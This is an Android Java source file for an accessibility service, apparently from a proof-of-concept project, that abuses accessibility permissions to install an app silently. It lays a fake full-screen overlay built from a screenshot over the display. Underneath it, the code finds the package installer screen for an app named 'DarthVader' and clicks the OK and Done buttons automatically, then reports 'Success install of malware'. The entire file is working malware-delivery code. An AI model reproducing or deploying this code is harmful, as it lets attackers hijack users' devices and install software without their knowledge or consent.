package com.andrei.host;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.Toast;

import com.andrei.host.presentation.ui.MalwareInstallationActivity;

public class ClickerService extends AccessibilityService /*implements ServiceConnection*/ {

    public static final String TAG = ClickerService.class.getSimpleName();
    private FrameLayout mLayout;
    private View mRootView;
    private WindowManager mWindowManager;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        interceptClicks(event);
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            automateCLicks(event);
        }
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    protected void onServiceConnected() {
//        super.onServiceConnected();
        mWindowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        mLayout = new FrameLayout(this);
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        lp.format = PixelFormat.TRANSLUCENT;
        lp.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        lp.width = WindowManager.LayoutParams.MATCH_PARENT;
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
        lp.gravity = Gravity.TOP;
        LayoutInflater inflater = LayoutInflater.from(this);
        mRootView = inflater.inflate(R.layout.accessibilty_service_layout, mLayout);
        mWindowManager.addView(mLayout, lp);
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT |
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;

        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.packageNames = null;
        setServiceInfo(info);

//        //set the fake toolbar
//        Toolbar toolbar = (Toolbar) mRootView.findViewById(R.id.toolbar);
//        toolbar.setTitle(R.string.title_activity_malware_install);
    }

    private void automateCLicks(AccessibilityEvent event) {

        AccessibilityNodeInfo nodeInfo = event.getSource();
        boolean isMalwareInstallScreen = false;
        if (nodeInfo.getPackageName().equals("com.google.android.packageinstaller")) {
            for (int i = 0; i < nodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo currentNode = nodeInfo.getChild(i);
                if (currentNode != null && currentNode.getViewIdResourceName() != null) {

                    // TODO: 28/04/2018 maybe include this in documentation
                    // make sure it's package installer for de malitious app not a permission
                    if (currentNode.getText() != null &&
                            currentNode.getText().toString().equals("DarthVader")) {
                        isMalwareInstallScreen = true;
                    }

                    if (isMalwareInstallScreen &&
                            (currentNode.getViewIdResourceName().contains("ok_button") ||
                                    currentNode.getViewIdResourceName().contains("done_button"))) {

                        currentNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                }
            }
        }
    }

    private void interceptClicks(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo nodeInfo = event.getSource();
            if (nodeInfo == null) {
                return;
            }
            nodeInfo.refresh();
            if (nodeInfo.getViewIdResourceName() != null &&
                    nodeInfo.getViewIdResourceName().equals(getPackageName() + ":id/btn_access")) {
                if (MalwareInstallationActivity.showOverlay) {
                    createFakeOverlay();
                }
            } else if (nodeInfo.getText() != null &&
                    nodeInfo.getText().toString().equalsIgnoreCase("DONE")) {

                Handler handler = new Handler();
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(getApplicationContext(), "Success install of malware", Toast.LENGTH_SHORT).show();
                        MalwareInstallationActivity.showOverlay = false;
                        removeFakeOverlay();
                    }
                }, 1000);
            }
        }
    }

    private void createFakeOverlay() {
//        TextView tvRedBar = (TextView) mRootView.findViewById(R.id.red_bar);
//        tvRedBar.setBackgroundColor(Color.BLACK);

        ImageView imageView = (ImageView) mRootView.findViewById(R.id.fake_screen);
        if (MalwareInstallationActivity.mBitmapDrawableScreenshot != null) {
            imageView.setImageDrawable(MalwareInstallationActivity.mBitmapDrawableScreenshot);
            imageView.setVisibility(View.VISIBLE);
        }

        WindowManager.LayoutParams params = (WindowManager.LayoutParams) mRootView.getLayoutParams();
        params.height = WindowManager.LayoutParams.MATCH_PARENT;
        mWindowManager.updateViewLayout(mRootView, params);
    }

    private void removeFakeOverlay() {
//        TextView tvRedBar = (TextView) mRootView.findViewById(R.id.red_bar);
//        tvRedBar.setBackgroundColor(Color.RED);

        ImageView imageView = (ImageView) mRootView.findViewById(R.id.fake_screen);
        imageView.setVisibility(View.GONE);

        WindowManager.LayoutParams params = (WindowManager.LayoutParams) mRootView.getLayoutParams();
        params.height = WindowManager.LayoutParams.WRAP_CONTENT;
        mWindowManager.updateViewLayout(mRootView, params);
    }

//    private void setScreenMode(boolean fullscreen) {
//        if (fullscreen) {
//            getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
//            getWindow().clearFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
//        } else {
//            getWindow().addFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
//            getWindow().clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
//        }
//
//    }

}
